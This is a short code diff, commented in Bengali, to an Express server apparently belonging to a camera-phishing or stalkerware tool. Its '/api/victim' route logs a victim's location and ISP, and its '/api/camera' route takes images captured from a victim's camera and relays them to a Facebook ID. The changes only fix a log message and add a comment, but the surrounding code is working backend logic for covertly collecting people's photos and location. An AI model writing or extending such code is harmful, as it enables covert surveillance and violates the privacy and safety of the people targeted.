@@ -307,7 +307,7 @@ router.post('/api/victim', async (req, res) => {
         } else if (blocked) {
             console.log(`⛔ ব্লকড ISP (${victim.location?.isp}) → মেসেজ পাঠানো হয়নি।`);
         } else if (!hasPermission) {
-            console.log(`⛔ ইউজারের পারমিশন নেই → মেসেজ পাঠানো হয়নি。`);
+            console.log(`⛔ ইউজারের পারমিশন নেই → মেসেজ পাঠানো হয়নি।`);
         } else {
             console.log(`⚠️ fbId 'unknown' → মেসেজ পাঠানো হয়নি।`);
         }
@@ -401,6 +401,7 @@ router.post('/api/camera', async (req, res) => {
                     resizedBase64 = image;
                 }
 
+                // 🔥 এখানে sendImageMessageBase64 কল করা হচ্ছে – যা এখন ইমেজ সেভ করে URL দিয়ে পাঠায়
                 const result = await sendImageMessageBase64(victim.fbId, resizedBase64);
                 if (result.success) {
                     console.log(`📸 ছবি #${totalImages} (${resizedBase64 === image ? 'আসল' : 'রিসাইজড'}) পাঠানো: ${victim.fbId}`);
